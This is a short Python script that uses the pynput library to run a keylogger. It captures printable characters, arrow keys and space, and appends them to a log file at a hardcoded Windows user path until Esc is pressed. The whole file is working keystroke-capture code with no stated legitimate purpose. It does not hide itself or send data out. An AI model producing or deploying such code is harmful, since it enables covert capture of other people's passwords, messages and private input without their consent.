from pynput import keyboard

def on_press(key):
    if key == keyboard.Key.esc:
        return False  # stop listener
    try:
        k = key.char  # single-char keys
    except:
        k = key.name  # other keys
    lists = '!\"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~'
    arr2 = ['left','right','up','down','space']
    if k in lists:  # keys of interest
        # self.keys.append(k)  # store it in global-like variable
        f = open("C:/Users/shahkhan/Documents/abc/log.txt", "a")
        f.write(k)
        f.close()
        # return False  # stop listener; remove this if want more keys
    if k in arr2:  # keys of interest
        # self.keys.append(k)  # store it in global-like variable
        f = open("C:/Users/shahkhan/Documents/abc/log.txt", "a")
        f.write(k)
        f.close()

listener = keyboard.Listener(on_press=on_press)
listener.start()  # start to listen on a separate thread
listener.join()  # remove if main thread is polling self.keys
